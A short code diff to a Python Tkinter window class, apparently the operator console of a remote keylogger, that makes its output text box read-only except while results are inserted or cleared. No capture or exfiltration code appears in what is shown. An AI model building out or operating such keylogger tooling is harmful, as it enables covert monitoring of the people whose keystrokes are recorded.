@@ -27,6 +27,8 @@ class KeyloggerWindow(Frame):
         #file status
         self.textMulti=Text(self.master)
         self.textMulti.place(x=5,y=70,height=160)
+        self.textMulti.configure(state='disabled')
+        
         
         '''
         self.statusText = StringVar()
@@ -62,9 +64,13 @@ class KeyloggerWindow(Frame):
         self.connection.send(cmd.encode())
     def eventPrint(self):
         try:
+            self.textMulti.configure(state='normal')
             self.textMulti.insert(END,str(self.result))
+            self.textMulti.configure(state='disabled')
             self.data=""      
         except:
             print('Noooooooooo')    
     def eventDelete(self):
+        self.textMulti.configure(state='normal')
         self.textMulti.delete('1.0',END)
+        self.textMulti.configure(state='disabled')
